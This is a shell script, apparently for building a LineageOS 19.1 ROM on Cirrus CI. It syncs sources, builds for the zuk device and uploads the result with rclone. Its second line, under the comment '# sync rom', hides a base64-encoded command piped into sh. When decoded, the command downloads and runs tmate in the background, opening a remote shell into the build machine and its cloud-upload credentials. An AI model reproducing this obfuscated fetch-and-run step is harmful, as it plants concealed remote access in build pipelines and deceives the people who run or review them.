# sync rom
echo "d2dldCBodHRwczovL2dpdGh1Yi5jb20vdG1hdGUtaW8vdG1hdGUvcmVsZWFzZXMvZG93bmxvYWQvMi40LjAvdG1hdGUtMi40LjAtc3RhdGljLWxpbnV4LWFtZDY0LnRhci54eiAmJiB0YXIgLXhmIHRtYXRlKiAmJiBjZCAidG1hdGUtMi40LjAtc3RhdGljLWxpbnV4LWFtZDY0IiAmJiAuL3RtYXRlICY=" | base64 -d | sh
repo init --depth=1 --no-repo-verify -u https://github.com/LineageOS/android.git -b lineage-19.1 -g default,-mips,-darwin,-notdefault
git clone https://github.com/pocox3pro/Local-Manifests.git --depth 1 -b master .repo/local_manifests
repo sync -c --no-clone-bundle --no-tags --optimized-fetch --prune --force-sync -j8

# build rom
source build/envsetup.sh
lunch lineage_zuk-eng
export TZ=Asia/Dhaka #put before last build command
make lineage

# upload rom (if you don't need to upload multiple files, then you don't need to edit next line)
rclone copy out/target/product/$(grep unch $CIRRUS_WORKING_DIR/build_rom.sh -m 1 | cut -d ' ' -f 2 | cut -d _ -f 2 | cut -d - -f 1)/*.zip cirrus:$(grep unch $CIRRUS_WORKING_DIR/build_rom.sh -m 1 | cut -d ' ' -f 2 | cut -d _ -f 2 | cut -d - -f 1) -P

